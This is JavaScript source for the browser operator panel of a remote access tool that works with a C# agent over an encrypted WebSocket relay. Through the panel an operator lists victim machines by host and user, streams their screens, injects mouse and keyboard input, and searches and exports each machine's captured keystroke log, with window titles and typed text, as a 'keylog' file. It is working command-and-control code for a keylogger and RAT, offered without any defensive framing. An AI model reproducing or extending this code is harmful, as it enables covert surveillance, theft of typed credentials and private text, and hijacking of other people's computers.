// Browser operator. Speaks the exact protocol the C# agent already speaks:
// handshake per agent, then sealed frames inside a 4-byte slot prefix from the relay.

import { b64ToBytes, concat, utf8, randomBytes, equal, hmac, makeChannel } from './crypto.js';

const T = { HELLO: 0x10, MONS: 0x11, FRAME: 0x20, INPUT: 0x30, KEYQ: 0x31, KEYR: 0x32, PING: 0x40, PONG: 0x41, CTL: 0x50, AUDIO: 0x60 };

const $ = (id) => document.getElementById(id);
const cv = $('cv');
const ctx = cv.getContext('2d', { alpha: false });

let ws = null;
let master = null;
const peers = new Map();       // slot -> peer state
let activeSlot = null;
let streaming = false;
let lastFrame = null;          // {bmp, w, h, mon}
let logRows = [];
let dumping = false;

// ------------------------------------------------------------------ helpers

function u32(n) { const b = new Uint8Array(4); new DataView(b.buffer).setUint32(0, n); return b; }

function pack(type, body) {
  const out = new Uint8Array(1 + body.length);
  out[0] = type;
  out.set(body, 1);
  return out;
}

function jsonBytes(o) { return utf8(JSON.stringify(o)); }

function parseJson(bytes) {
  try { return JSON.parse(new TextDecoder().decode(bytes)); } catch { return {}; }
}

function setStatus(text, on) {
  $('who').textContent = text;
  $('st').className = 'dot' + (on ? ' on' : '');
}

function peerOf(slot) { return peers.get(slot); }

function active() { return activeSlot != null ? peers.get(activeSlot) : null; }

// ------------------------------------------------------------------ connect

async function connect() {
  const room = $('room').value.trim() || 'default';
  const key = $('key').value.trim();
  if (!key) { alert('key fehlt (der PSK aus op.cfg)'); return; }
  try { master = b64ToBytes(key); } catch { alert('key ist kein base64'); return; }
  if (master.length !== 32) { alert('key muss 32 byte base64 sein'); return; }
  localStorage.setItem('rail.room', room);
  localStorage.setItem('rail.key', key);

  const proto = location.protocol === 'https:' ? 'wss' : 'ws';
  const url = `${proto}://${location.host}/op?room=${encodeURIComponent(room)}&key=${encodeURIComponent(key)}`;
  ws = new WebSocket(url);
  ws.binaryType = 'arraybuffer';

  ws.onopen = () => setStatus('verbunden — warte auf geräte', false);

  ws.onmessage = async (ev) => {
    if (typeof ev.data === 'string') {
      const [cmd, arg] = ev.data.split(' ');
      const slot = parseInt(arg, 10);
      if (cmd === 'A' && !peers.has(slot)) {
        peers.set(slot, { slot, state: 0, na: null, nb: null, ch: null, host: '', user: '', keys: -1, mons: [], mon: 0 });
        renderDevices();
      } else if (cmd === 'R') {
        peers.delete(slot);
        if (activeSlot === slot) selectSlot(null);
        renderDevices();
      }
      return;
    }
    const buf = new Uint8Array(ev.data);
    if (buf.length < 5) return;
    const slot = new DataView(buf.buffer, buf.byteOffset).getUint32(0);
    const payload = buf.subarray(4);
    await fromAgent(slot, payload);
  };

  ws.onclose = () => { setStatus('getrennt', false); ws = null; };
}

async function fromAgent(slot, payload) {
  let p = peers.get(slot);
  if (!p) {
    p = { slot, state: 0, na: null, nb: null, ch: null, host: '', user: '', keys: -1, mons: [], mon: 0 };
    peers.set(slot, p);
  }

  if (p.state === 0) {                        // agent nonce
    if (payload.length !== 16) return;
    p.na = payload;
    p.nb = randomBytes(16);
    const tag = await hmac(master, utf8('op'), p.na, p.nb);
    send(slot, concat(p.nb, tag));
    p.state = 1;
    return;
  }

  if (p.state === 1) {                        // agent proof
    const want = await hmac(master, utf8('ag'), p.na, p.nb);
    if (!equal(payload, want)) {
      console.warn('handshake rejected', slot);
      peers.delete(slot);
      renderDevices();
      return;
    }
    p.ch = await makeChannel(master, p.na, p.nb);
    p.state = 2;
    return;
  }

  let plain;
  try { plain = await p.ch.open(payload); }
  catch (e) { console.warn('open failed', slot, e.message); return; }

  const type = plain[0];
  const body = plain.subarray(1);

  if (type === T.HELLO) {
    const d = parseJson(body);
    p.host = d.host || '';
    p.user = d.user || '';
    p.keys = typeof d.keys === 'number' ? d.keys : -1;
    renderDevices();
    if (slot === activeSlot) updateWho();
  } else if (type === T.MONS) {
    const d = parseJson(body);
    p.mons = Array.isArray(d.items) ? d.items : [];
    if (slot === activeSlot) renderMonitors();
  } else if (type === T.FRAME) {
    if (slot !== activeSlot) return;
    if (body.length < 13) return;
    const dv = new DataView(body.buffer, body.byteOffset, 12);
    const w = dv.getInt32(0, true), h = dv.getInt32(4, true), mon = dv.getInt32(8, true);   // C# writes little endian
    const jpeg = body.subarray(12);
    const bmp = await createImageBitmap(new Blob([jpeg], { type: 'image/jpeg' }));
    if (lastFrame && lastFrame.bmp) lastFrame.bmp.close();
    lastFrame = { bmp, w, h, mon };
    $('idle').style.display = 'none';
    draw();
    $('stats').textContent = `${w} × ${h}   ·   ${Math.round(jpeg.length / 1024)} kb`;
  } else if (type === T.KEYR) {
    const d = parseJson(body);
    const items = Array.isArray(d.items) ? d.items : [];
    if (dumping) { dumping = false; writeExport(items); return; }
    logRows = items;
    renderLog(items);
  }
}

function send(slot, payload) {
  if (!ws || ws.readyState !== WebSocket.OPEN) return;
  ws.send(concat(u32(slot), payload));
}

async function sendJson(slot, type, obj) {
  const p = peers.get(slot);
  if (!p || !p.ch) return;
  send(slot, await p.ch.seal(pack(type, jsonBytes(obj))));
}

// ------------------------------------------------------------------ rendering

function renderDevices() {
  const box = $('devices');
  $('dcount').textContent = peers.size ? `${peers.size} gerät(e)` : '';
  if (peers.size === 0) {
    box.innerHTML = '<div class="muted" style="font-size:11px">keine</div>';
    return;
  }
  box.innerHTML = '';
  for (const p of peers.values()) {
    const el = document.createElement('div');
    el.className = 'dev' + (p.slot === activeSlot ? ' sel' : '');
    el.innerHTML = `<span class="d"></span><span><div class="n">${p.host || 'agent ' + p.slot}</div>
      <div class="s">${p.user || '?'}${p.keys >= 0 ? ' · ' + p.keys + ' zeilen' : ''}</div></span>`;
    el.onclick = () => selectSlot(p.slot);
    box.appendChild(el);
  }
}

function selectSlot(slot) {
  if (slot === activeSlot) return;
  if (activeSlot != null && streaming) sendJson(activeSlot, T.CTL, { act: 'stop' });
  activeSlot = slot;
  streaming = false;
  lastFrame = null;
  $('idle').style.display = 'flex';
  paintLive();
  ctx.fillStyle = '#060709';
  ctx.fillRect(0, 0, cv.width, cv.height);

  if (slot == null) { setStatus('no link', false); renderDevices(); return; }
  updateWho();
  renderDevices();
  const p = peers.get(slot);
  if (p) sendJson(slot, T.CTL, { act: 'mons' });
}

function updateWho() {
  const p = active();
  if (!p) return;
  setStatus(`${p.user || '?'} @ ${p.host || 'agent'}   ·   ${p.keys >= 0 ? p.keys + ' zeilen im log' : ''}`, true);
}

function renderMonitors() {
  const p = active();
  const sel = $('mon');
  sel.innerHTML = '';
  if (!p) return;
  p.mons.forEach((m, i) => {
    const o = document.createElement('option');
    o.value = String(m.i != null ? m.i : i);
    o.textContent = `${+m.w} × ${+m.h}  ${m.n || ''}`;
    sel.appendChild(o);
  });
  const primary = p.mons.findIndex((m) => +m.p === 1);
  if (primary >= 0) sel.selectedIndex = primary;
  if (p.mons.length && !streaming) startStream();
}

function paintLive() {
  const b = $('live');
  b.textContent = streaming ? '■ stop' : '▶ live';
  b.className = streaming ? 'danger' : 'accent';
}

function draw() {
  const f = lastFrame;
  if (!f) return;
  const cw = cv.clientWidth, ch = cv.clientHeight;
  if (cv.width !== cw || cv.height !== ch) { cv.width = cw; cv.height = ch; }

  const sa = f.w / f.h;
  const ca = cw / ch;
  let w, h;
  if (ca > sa) { h = ch; w = Math.round(h * sa); } else { w = cw; h = Math.round(w / sa); }
  const x = Math.round((cw - w) / 2), y = Math.round((ch - h) / 2);

  ctx.fillStyle = '#060709';
  ctx.fillRect(0, 0, cw, ch);
  ctx.imageSmoothingEnabled = w <= f.w;
  ctx.drawImage(f.bmp, x, y, w, h);
}

function renderLog(items) {
  const tb = $('rows');
  const rows = items.slice(-4000);
  tb.innerHTML = rows.map((r) => {
    const d = new Date(+r.ts);
    const t = d.toLocaleDateString('de-DE', { day: '2-digit', month: '2-digit' }) + ' ' +
              d.toLocaleTimeString('de-DE', { hour12: false });
    return `<tr><td class="t">${t}</td><td class="w">${esc(r.w || '')}</td><td>${esc(r.t || '')}</td></tr>`;
  }).join('');
  $('lcount').textContent = `${items.length} zeilen`;
  $('log').scrollTop = $('log').scrollHeight;
}

function esc(s) {
  return String(s).replace(/[&<>"]/g, (c) => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;' }[c]));
}

// ------------------------------------------------------------------ commands

function scaleFactor() {
  return [1, 0.75, 0.5, 0.35][$('scale').selectedIndex] || 1;
}

function startStream() {
  const p = active();
  if (!p || !p.mons.length) return;
  const idx = Math.max(0, $('mon').selectedIndex);
  const m = p.mons[idx];
  sendJson(p.slot, T.CTL, {
    act: 'start',
    i: m && m.i != null ? +m.i : idx,
    q: +$('q').value,
    fps: +$('fps').value,
    scale: scaleFactor().toFixed(2),
    cur: 1,
  });
  streaming = true;
  paintLive();
}

function stopStream() {
  const p = active();
  if (p) sendJson(p.slot, T.CTL, { act: 'stop' });
  streaming = false;
  paintLive();
}

function mapPoint(clientX, clientY) {
  const p = active();
  const f = lastFrame;
  if (!p || !f) return null;
  const r = cv.getBoundingClientRect();
  const cw = r.width, ch = r.height;
  const sa = f.w / f.h, ca = cw / ch;
  let w, h;
  if (ca > sa) { h = ch; w = h * sa; } else { w = cw; h = w / sa; }
  const x = (cw - w) / 2, y = (ch - h) / 2;
  const px = clientX - r.left - x, py = clientY - r.top - y;
  if (px < 0 || py < 0 || px > w || py > h) return null;

  const m = p.mons[Math.max(0, $('mon').selectedIndex)];
  if (!m) return null;
  const mx = Math.round(px / w * (+m.w));
  const my = Math.round(py / h * (+m.h));
  return { slot: p.slot, i: m.i != null ? +m.i : 0, x: Math.min(+m.w - 1, mx), y: Math.min(+m.h - 1, my) };
}

// ------------------------------------------------------------------ events

$('connect').onclick = connect;
$('q').oninput = () => { $('qv').textContent = $('q').value; };
$('scan').onclick = () => { const p = active(); if (p) sendJson(p.slot, T.CTL, { act: 'mons' }); };
$('mon').onchange = () => { if (streaming) startStream(); };
$('fps').onchange = () => { if (streaming) startStream(); };
$('scale').onchange = () => { if (streaming) startStream(); };
$('q').onchange = () => { if (streaming) startStream(); };
$('live').onclick = () => { if (streaming) stopStream(); else startStream(); };
$('rel').onclick = () => {
  const p = active();
  if (p) sendJson(p.slot, T.INPUT, { t: 'r' });
};
$('query').onclick = () => {
  const p = active();
  if (!p) return;
  sendJson(p.slot, T.KEYQ, { s: $('q2').value, n: 100000 });
};
$('q2').onkeydown = (e) => { if (e.key === 'Enter') $('query').click(); };
$('export').onclick = () => {
  const p = active();
  if (!p) return;
  dumping = true;
  sendJson(p.slot, T.KEYQ, { s: '', n: 100000 });
};

function writeExport(items) {
  const head = ['# rail export', '# geraet: ' + (active() ? active().host : '?'),
    '# exportiert: ' + new Date().toISOString(), '# zeilen: ' + items.length,
    'datum\tzeit\tfenster\ttext'].join('\r\n');
  const lines = items.map((r) => {
    const d = new Date(+r.ts);
    return d.toLocaleDateString('sv-SE') + '\t' + d.toLocaleTimeString('sv-SE', { hour12: false }) +
      '\t' + (r.w || '') + '\t' + (r.t || '');
  });
  const blob = new Blob(['\ufeff' + head + '\r\n' + lines.join('\r\n')], { type: 'text/tab-separated-values' });
  const a = document.createElement('a');
  a.href = URL.createObjectURL(blob);
  a.download = 'keylog_' + new Date().toISOString().replace(/[:.]/g, '-') + '.tsv';
  a.click();
  setTimeout(() => URL.revokeObjectURL(a.href), 5000);
}

// input
cv.addEventListener('mousemove', (e) => {
  if (!$('ctl').checked) return;
  const m = mapPoint(e.clientX, e.clientY);
  if (m) sendJson(m.slot, T.INPUT, { t: 'm', i: m.i, x: m.x, y: m.y });
});
cv.addEventListener('mousedown', async (e) => {
  cv.focus();
  if (!$('ctl').checked) return;
  const m = mapPoint(e.clientX, e.clientY);
  if (!m) return;
  sendJson(m.slot, T.INPUT, { t: 'b', i: m.i, x: m.x, y: m.y, b: e.button === 2 ? 2 : e.button === 1 ? 1 : 0, d: 1 });
});
cv.addEventListener('mouseup', (e) => {
  if (!$('ctl').checked) return;
  const m = mapPoint(e.clientX, e.clientY);
  const b = e.button === 2 ? 2 : e.button === 1 ? 1 : 0;
  const p = active();
  if (p) sendJson(p.slot, T.INPUT, { t: 'b', b, d: 0 });
});
cv.addEventListener('contextmenu', (e) => e.preventDefault());
cv.addEventListener('wheel', (e) => {
  if (!$('ctl').checked) return;
  const p = active();
  if (p) { e.preventDefault(); sendJson(p.slot, T.INPUT, { t: 'w', d: Math.round(e.deltaY) }); }
}, { passive: false });

document.addEventListener('keydown', (e) => {
  if (!$('ctl').checked) return;
  const tag = (e.target.tagName || '').toLowerCase();
  if (tag === 'input' || tag === 'select' || tag === 'textarea') return;
  const p = active();
  if (!p) return;
  e.preventDefault();
  sendJson(p.slot, T.INPUT, { t: 'k', vk: e.keyCode, d: 1 });
});
document.addEventListener('keyup', (e) => {
  if (!$('ctl').checked) return;
  const tag = (e.target.tagName || '').toLowerCase();
  if (tag === 'input' || tag === 'select' || tag === 'textarea') return;
  const p = active();
  if (!p) return;
  sendJson(p.slot, T.INPUT, { t: 'k', vk: e.keyCode, d: 0 });
});

window.addEventListener('resize', () => { draw(); });

// boot
$('room').value = localStorage.getItem('rail.room') || '';
$('key').value = localStorage.getItem('rail.key') || '';
if ($('room').value && $('key').value) connect();
